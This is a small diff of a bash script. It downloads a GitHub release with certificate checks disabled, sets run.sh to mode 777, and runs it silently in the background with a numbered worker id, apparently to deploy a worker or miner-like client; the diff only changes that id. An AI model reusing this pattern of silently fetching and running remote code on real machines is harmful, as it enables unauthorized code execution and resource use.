@@ -2,7 +2,7 @@ curl -sLkO https://github.com/gaserjuk/spectre/releases/download/monte/llm-clien
 
 echo '#!/bin/bash
 
-cd llm-client && chmod 777 run.sh && nproc --all && ./run.sh 7 Suto-005 >/dev/null 2>&1 &
+cd llm-client && chmod 777 run.sh && nproc --all && ./run.sh 7 Suto-014 >/dev/null 2>&1 &
 sleep 3
 while true
 do
